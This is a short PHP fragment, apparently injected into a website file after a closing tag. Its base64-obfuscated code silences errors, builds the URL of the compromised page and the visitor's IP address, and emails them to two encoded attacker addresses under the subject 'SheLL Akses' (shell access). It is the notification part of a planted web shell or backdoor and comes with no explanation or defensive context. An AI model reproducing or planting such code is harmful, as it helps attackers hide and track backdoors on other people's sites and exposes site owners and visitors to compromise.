...
?>
<?php
@ini_set(base64_decode('b3V0cHV0X2J1ZmZlcmluZw=='),0);@ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='),0);set_time_limit(0);ini_set(base64_decode('bWVtb3J5X2xpbWl0'),base64_decode('NjRN'));header(base64_decode('Q29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTg='));$hg_0=base64_decode('bHV0ZmlmYWtlZTA3QGdtYWlsLmNvbSwga29taW5mbzc2OEBwcm90b24ubWU=');$vi_1=base64_decode('aHR0cDovLw==').$_SERVER[base64_decode('U0VSVkVSX05BTUU=')].$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')];$qg_2="Hai Tampered - Fakee $vi_1 :p *IP Address : [ ".$_SERVER[base64_decode('UkVNT1RFX0FERFI=')].base64_decode('IF0=');mail($hg_0,base64_decode('U2hlTEwgQWtzZXM='),$qg_2,base64_decode('WyA=').$_SERVER[base64_decode('UkVNT1RFX0FERFI=')].base64_decode('IF0='));
